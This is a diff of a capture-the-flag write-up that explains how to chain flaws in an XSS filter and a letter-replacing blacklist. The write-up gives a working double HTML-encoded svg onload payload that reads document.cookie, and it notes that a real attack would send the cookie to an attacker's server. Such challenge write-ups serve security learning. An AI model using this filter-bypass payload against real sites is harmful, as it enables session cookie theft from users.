@@ -7,17 +7,14 @@ The intended solution involves chaining together the following three vulnerabili
 When used in conjunction, these vulnerabilies allow you to construct a payload that bypasses the XSS filter as well as the blacklist filter.
 The purpose of the blacklist filter (`sanitized.replace(/C/g, '\u0421').replace(/c/g, '\u0441')`) is to make it so that if players want to access the `document.cookie` value, they have to take advantage of the fact that the XSS filter does not re-escape attribute values.
 
-As an example, the payload
-```<svg onload="alert(document.cookie)">``` 
+As an example, the payload `<svg onload="alert(document.cookie)">` 
 would easily be caught by the blacklist filter because it contains multiple c's. HTML encoding the JavaScript portion once would give you
 ```html
 <svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;>
 ```
-which would still be caught as it would revert to
-```html
-<svg onload="alert(document.cookie)">
-``` 
-once it is un-escaped by the XSS filter. HTML encoding the JavaScript portion of the payload twice works because 
+which would still be caught as it would revert to `<svg onload="alert(document.cookie)">` once it is un-escaped by the XSS filter.
+
+HTML encoding the JavaScript portion of the payload twice works because 
 ```html
 <svg onload=&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#48;&#56;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;&#38;&#35;&#49;&#48;&#48;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#55;&#59;&#38;&#35;&#49;&#48;&#57;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#48;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#54;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#49;&#48;&#55;&#59;&#38;&#35;&#49;&#48;&#53;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#52;&#49;&#59;>
 ```
@@ -25,10 +22,8 @@ becomes
 ```html
 <svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;>
 ```
-after passing through the XSS filter. This payload will also now make it past the blacklist filter and be served as a webpage to the hero, which un-escapes it an additional time and interprets it as
-```html
-<svg onload="alert(document.cookie)">
-``` as intended. Please note that the actual payload will need to send the cookie to another server controlled by the attacker and the above payload is just for illustrative purposes.
+after passing through the XSS filter. This payload will now make it past the blacklist filter and be served as a webpage to the hero, which will un-escape it an additional time and interpret it as
+`<svg onload="alert(document.cookie)">` as intended. Please note that the actual payload will need to send the cookie to another server controlled by the attacker and the above payload is just for illustrative purposes.
 
 The blacklist filter also forces players to use a somewhat more rare XSS payload that doesn't directly contain a "c", as a lot of the most common ones do (e.g. <code><s<b>c</b>ript sr<b>c</b>=...</code>, <code><img sr<b>c</b>=...</code>, <code><iframe sr<b>c</b>=...</code>, etc.).
 
